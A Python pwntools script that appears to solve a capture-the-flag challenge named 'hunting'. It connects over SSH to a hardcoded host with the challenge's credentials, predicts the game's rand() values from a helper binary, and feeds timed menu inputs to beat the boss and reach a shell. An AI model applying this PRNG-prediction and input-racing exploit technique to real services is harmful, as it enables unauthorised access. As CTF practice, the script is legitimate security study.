#!/usr/bin/python
from ctypes import *
from sys import exit
from time import sleep
from pwn import *
#random.seed(datetime.now())

s = ssh(host = '110.10.212.133', user = 'hunting', password = 'hunting', port = 5556)

p = s.process ("/home/hunting/hunting")
r = s.process(['a.out'], cwd='/tmp/hunter/')

rlist = r.recvall()
rlist = rlist.split('\n')[:-1]
rcnt = 0

sleep (0.5)
no_use = ''
payload = ""

rl = []

def do_rand ():
    global rlist, rcnt

    value = rlist[rcnt]
    rcnt += 1

    return value

#(libc.abs ((libc.rand () * 1337) % 1024) - 1 - 8)  / 16 + 1
cr = 0

cnt = 0
for x in xrange (3000):
    rl.append (do_rand())


def add_pay (pay):
  return str(pay) + "\n"


def boss_attack (rv):
  at = rv % 4
  if at == 1:
    return 3
  if at == 0:
    return 1
  if at == 2:
    return 2
  return 0


#payload += "3\n3\n"
p.send ("3\n3\n")
p.recvuntil ("choice:")
p.recvuntil ("choice:")
cnt += 1
for i in xrange (20):
#  payload += add_pay (2)
#  payload += add_pay (boss_attack(rl[cnt]))
  sleep (0.1)
  p.send ("2\n")
  p.recvuntil ("choice:")
  sleep (0.1)
  p.sendline (str (boss_attack(rl[cnt])))
  p.recvuntil ("Boss's hp is")
  p.recvline()
  p.recvline()
  haha = p.recvline()
  if "level:4" in haha :
    print "haha"
    print haha
    break

  cnt += 2



finalpay= ""

for i in xrange (16):
  finalpay = ""
  finalpay += add_pay (3)
  finalpay += add_pay (2)
  finalpay += add_pay (2)
  finalpay += add_pay (boss_attack(rl[cnt]))
  cnt += 1
  finalpay += add_pay (3)
  finalpay += add_pay (7)
  finalpay += add_pay (2)
  finalpay += add_pay (boss_attack(rl[cnt]))
  cnt += 5
  p.send (finalpay)
  sleep (1)
  p.interactive ()
#print finalpay

p.interactive ()
